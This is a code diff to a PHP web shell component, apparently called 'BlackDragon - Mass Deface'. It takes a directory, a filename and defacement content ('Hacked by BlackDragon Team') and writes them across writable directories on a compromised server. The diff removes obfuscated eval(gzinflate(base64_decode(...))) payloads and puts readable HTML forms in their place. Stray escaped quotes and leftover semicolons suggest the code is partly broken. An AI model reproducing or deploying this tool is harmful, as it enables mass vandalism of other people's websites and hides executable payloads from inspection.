@@ -1,5 +1,4 @@
 <?php
-
 function deface($dir,$filename,$content){
     if(is_writable($dir)){
         $dira = scandir($dir);
@@ -30,10 +29,112 @@ function deface($dir,$filename,$content){
 }
     
 if (isset($_POST[\'start\'])){
-    eval("?>".gzinflate(base64_decode("pVZtb9s2EP4+YP+BIDYkASYpTtIudSVndZKiRVt0axOk21AUFEVJtPmikicnQtH/XlK2W0m2U3QTYEO8Oz5399wLFJcgxeTnn5B74pKRbPXeniUDgmhJjGWQ4Bry4BR39YKrOSoNyxNcAlR2HEU0U+HMZkzwhQkVg0hVMkq1BguGVH88CEfhcZRxCxG19psilFyFToKRYSLBFhrBbMkYYMQVsMJwaJy4JMenJ8FoKi9P5jfTj7+f8r/LpyJbvKjL/OrJ9UNSX5/C1aOTG/Msh9lFas4v3729Hump/tiIo78W/zycPb85xogaba02vOAqwURp1Uhd283cNoLpJ5trBTYstC4EIxW3IdXS53WWE8lFk7zUqQVmerjAQbDJVBA6vzCk0AoF6BWxFl2wnFAWR0uDzo3Wf0fgn1Rnzae+yD8l40UJYzQ6PPz18aba8V4J0oxRLtjdFv2stsDzJqAuL6YcDnX/zGyxJIIXKuDApN1h9bl/LI/Qlng9gcGSrDFasXU/jiApEzuhblf5p1pkO2HiqMtoHHW6Pva8IipcPRKcFkFGzBwBu4NAeOBeITO+WFt6vghX/UoPjVqYJVVDs9a0PLqvK5x2AO2maDGU5dpI5Ka21FmC/3z99mqrp05QWeBbYVj4VZidKq8l2/CGmEbfotvgwSGSEIx2XRheqpr7bVv7ZfFdkglWRLKAq1zjNYLPPWgt8OQNs7UANI6jVvA9XF8aYhjpQXkujBZuI+lbJxsdulXkWD3XVfPUaHnl7jxxd/AkPqvKCmVtofZ/+eBp/3cv+5Bxs/f+N/RNkHPB+hJu+d77g8fobOLGfhXDfXxtKfn/4jOtAVyrQVMx1+7t4SudKSjkfkFluCTGDYUWgSiCI4y0ooLTeYJnljoy9g/wxJMSR0uE7zklP+pvuXPP8GTqpiOO/itDu3RbBynyLdCd9o5RbKnhFXS0ea0ocMfkmpHhgloQ43SeJZSgTNNaunEKCwaXgvnXafM8299srYPBLlxChLkDsPs7lJYJRmFD+9Upu2P0XEtJlPPoo+15+bxeir0cXWndXnQHt4f858IX")));
+
+?><html>
+    <head>
+        <meta charset="utf-8">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+        <title>BlackDragon - Mass Deface</title>
+        <style>
+            body{
+                height: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            h2 {
+                font-family: Lobster;
+            }
+            label {
+                font-weight: bold
+            }
+        </style>
+    </head>
+    <body class="bg-dark text-light">
+        <div class="container">
+            <div class="text-center">
+                <h2>BlackDragon - Mass Deface</h2>
+            </div>
+            <form method="POST">
+                <div class="d-flex justify-content-center align-item-center ">
+                    <div class="row w-50 mt-1">
+                        <div class="py-1">
+                            <label for="name-info" class="form-label">Result :</label>
+                            <textarea class="form-control" rows="10" id="CopyFromTextArea"><?php deface($_POST['d_dir'], $_POST['d_file'], $_POST['d_isi']); ?></textarea>
+                        </div>
+                        <div class="py-1">
+                            <button type="button" class="btn btn-primary col-lg-2" onclick="jscopy()">Copy</button>
+                            <a type="button" class="btn btn-primary col-lg-2" href="?">Back</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    <script>
+        function jscopy() {
+            var jsCopy = document.getElementById("CopyFromTextArea");
+            jsCopy.focus();
+            jsCopy.select();
+            document.execCommand("copy");
+        }
+    </script>
+    </body>
+</html>;
 }else{ 
     $path = getcwd();
     $path = str_replace(\'\\', \'/\', $path);
-    eval("?>".gzinflate(base64_decode("zVZRb9s2EH4v0P9AEBvyJClO0i5zJWdN0qLDVixbEmTrS0GJJ5EJRSrkyalQ9L+XtGxEdmwnKLphBGyYdx8/3n3HI50KrNXk+TPiRyqA8fnv2bwGZKQQzDrAjLZYRod06FdS3xBhocyoQGzcOEkKruNrx0HJqY01YKKbOsmNQYeWNb+8iEfxfsKlw6Rw7t4R11LH3kKJBZVRh50CJwCQEqkRKiux82bB9g8PotFx/ebg5ur49qdD+Y94q/j0t1aUF68vX7L28hAvfj64su9KvD7N7cmbv88vR+bY3HZq78/ph5fXv17tU1JY45yxspI6o0wb3dWmdQ9zexDMcrKl0ejiyphKAWukiwtTh7yOSlZL1WW/m9wh2CVelKhgcqxYcXNqWWU0ich75hw5hZIVkCY9YLBitv/AEEZuePd52RSGAFkJHJPR7u6Prx66ve6NYt2YlAo+rfFftw5l2UWFzwu05yn8N9g1SKZkpSOJULsNqC/LU7FH1sQbBIx6scZkrtZ2HsVyUBup7ub550bxjTRpMlQ0TQanPg26kkL5emQ0ryLO7A1B+ISRCsRLheRyukAGvZjUy5VeBc1oeqlWYTOo2Nt2Krx3hdp30XTVVhpbE9+1wvCMnv1xfrF2p0FQPApHYbXw8zAHVV5Y1vGtclpzR+6iF7ukxmi0acHqoqbbjp3h++L7JD2eoYikLg1dMITcoxmCTs68l4zTZDZ9jFXqpkWCXQN9kZYZgyTWKEo0qz2Af+TSUjJlqoVsJz3KyA8hFHI02SGSL8Vl4baVFvg2BdYU8XspFOLdrNBbqSAg/i2VSs9Pib9tChC+GcEHlPO4EQ2dyTQI7n8t00nfEE9WKSjDLLDt4kgnV7R55xsfOMk7MrwDLoDVXiBz55lGu3TiH4c5/38p1rDyrs1reV/7HDXxn6ixsmbW35xGRaqK9hapOh8sLrqFnveLH9svbxF98v2GFhw8Yb/JXwGXJv3ab1Rnk2/tVZuE0g7fgwHIx+HfET/x93b4e/UV")));
+    
+?><html>
+    <head>
+        <meta charset="utf-8">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+        <title>BlackDragon - Mass Deface</title>
+        <style>
+            body{
+                height: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            h2 {
+                font-family: Lobster;
+            }
+            label {
+                font-weight: bold
+            }
+        </style>
+    </head>
+    <body class="bg-dark text-light">
+        <div class="container">
+            <div class="text-center">
+                <h2>BlackDragon - Mass Deface</h2>
+            </div>
+            <form method="POST">
+                <div class="d-flex justify-content-center align-item-center ">
+                    <div class="row w-50 mt-1">
+                        <div class="py-1">
+                            <label for="path-info" class="form-label">Path :</label>
+                            <input type="text" class="form-control" name="d_dir" value='<?= $path ?>' id="path-info" required>
+                        </div>
+                        <div class="py-1">
+                            <label for="name-info" class="form-label">Filename :</label>
+                            <input type="text" class="form-control" name="d_file" placeholder="bd.php" id="name-info" required>
+                        </div>
+                        <div class="py-1">
+                            <label for="name-info" class="form-label">Content :</label>
+                            <textarea class="form-control" name="d_isi" placeholder="Hacked by BlackDragon Team" rows="10"></textarea>
+                        </div>
+                        <div class="py-1">
+                            <input type="submit" class="btn btn-primary col-lg-2" name="start" value="Submit">
+                            <button type="reset" class="btn btn-primary col-lg-2">Reset</button>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </body>
+</html>;
 }
 ?>
